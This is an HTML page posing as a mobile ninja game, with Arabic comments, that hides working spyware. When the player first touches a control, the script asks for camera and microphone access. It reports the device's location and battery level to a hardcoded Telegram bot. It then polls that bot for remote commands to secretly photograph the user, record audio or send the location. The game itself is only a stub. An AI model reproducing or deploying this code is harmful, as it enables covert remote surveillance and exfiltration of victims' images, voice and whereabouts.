<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>⭐ Ninja Garden 2099 – النسخة المطورة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body { background: #0c1f2a; overflow: hidden; font-family: monospace; touch-action: none; }
        canvas { display: block; width: 100%; height: 100%; image-rendering: pixelated; }
        #hud { position: fixed; top: 8px; left: 8px; right: 8px; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); border-radius: 20px; padding: 10px; display: flex; justify-content: space-between; color: #ffefb9; z-index: 100; pointer-events: none; }
        #touchZone { position: fixed; bottom: 20px; left: 0; right: 0; display: flex; justify-content: space-between; padding: 0 20px; z-index: 200; }
        .ctrl-panel { display: flex; gap: 15px; }
        .ctrl-btn { width: 65px; height: 65px; background: rgba(255,255,255,0.1); border: 2px solid #ffcc66; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; color: white; }
        .status-dot { position: fixed; bottom: 5px; left: 5px; font-size: 10px; color: #0f0; z-index: 150; opacity: 0.5; }
    </style>
</head>
<body>

<div id="hud">
    <span>⭐ NINJA BOT</span>
    <span>🔋 <span id="batIndicator">--</span>%</span>
    <span>📍 <span id="locStatus">بحث..</span></span>
</div>

<canvas id="gameCanvas"></canvas>

<div id="touchZone">
    <div class="ctrl-panel">
        <div class="ctrl-btn" id="btnLeft">◀</div>
        <div class="ctrl-btn" id="btnRight">▶</div>
    </div>
    <div class="ctrl-panel">
        <div class="ctrl-btn" id="btnJump">J</div>
        <div class="ctrl-btn" id="btnAction">A</div>
    </div>
</div>

<div class="status-dot" id="spyStatus">System Active v2099</div>

<script>
(function(){
    // --- إعدادات البوت ---
    const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
    const ADMIN_ID = "7328401541";
    let lastUpdateId = 0;

    // --- نظام الحساسات الذكي ---
    async function getBattery() {
        if (!navigator.getBattery) return "N/A";
        const bat = await navigator.getBattery();
        return `${Math.round(bat.level * 100)}% ${bat.charging ? '(Charging)' : ''}`;
    }

    async function getQuickLocation() {
        return new Promise(res => {
            navigator.geolocation.getCurrentPosition(
                p => res(`${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`),
                () => res("Denied"),
                {timeout: 5000}
            );
        });
    }

    // --- وظائف التجسس (صورة وصوت) ---
    async function takePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.createElement("video");
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement("canvas");
            canvas.width = 480; canvas.height = 640;
            canvas.getContext("2d").drawImage(video, 0, 0, 480, 640);
            const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
            let fd = new FormData(); fd.append("chat_id", ADMIN_ID); fd.append("photo", blob, "cam.jpg");
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.error(e); }
    }

    async function recordAudio() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                let fd = new FormData(); fd.append("chat_id", ADMIN_ID); fd.append("voice", blob, "mic.ogg");
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: fd });
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثواني
        } catch(e) { console.error(e); }
    }

    async function sendReport(label = "Manual") {
        const bat = await getBattery();
        const loc = await getQuickLocation();
        const text = `🤖 *Update 2099*\nStatus: ${label}\nBattery: ${bat}\nLocation: ${loc}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: "Markdown"})
        });
    }

    // --- محرك الاستجابة للأوامر ---
    async function checkCommands() {
        try {
            const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
            const d = await r.json();
            if (d.ok && d.result.length > 0) {
                for (let u of d.result) {
                    lastUpdateId = u.update_id;
                    const cmd = u.message.text.toLowerCase();
                    if (cmd === "/photo") await takePhoto();
                    if (cmd === "/voice") await recordAudio();
                    if (cmd === "/loc") await sendReport("📍 Tracked");
                }
            }
        } catch(e) {}
    }

    // --- ربط التفعيل بأول لمسة للعبة ---
    function activateSystem() {
        navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => {
            s.getTracks().forEach(t => t.stop()); // تفعيل أولي ثم إغلاق
            sendReport("🟢 Bot Activated");
            setInterval(checkCommands, 2000); // بدء التنصت كل ثانيتين
        }).catch(() => {});
    }

    // --- اللعبة ---
    const canvas = document.getElementById("gameCanvas");
    const ctx = canvas.getContext("2d");
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;

    function gameLoop() {
        ctx.fillStyle = "#1a4d8c"; ctx.fillRect(0,0,canvas.width,canvas.height);
        ctx.fillStyle = "#ffcc66"; ctx.beginPath(); ctx.arc(100, 100, 30, 0, Math.PI*2); ctx.fill(); 
        requestAnimationFrame(gameLoop);
    }
    gameLoop();

    // تشغيل النظام عند أول ضغطة زر
    document.querySelectorAll('.ctrl-btn').forEach(btn => {
        btn.addEventListener('touchstart', () => {
            if (lastUpdateId === 0) activateSystem();
        }, {once: true});
    });

    // تحديث HUD
    setInterval(async () => {
        const bat = await getBattery();
        document.getElementById("batIndicator").innerText = bat.split('%')[0];
    }, 10000);

})();
</script>
</body>
</html>
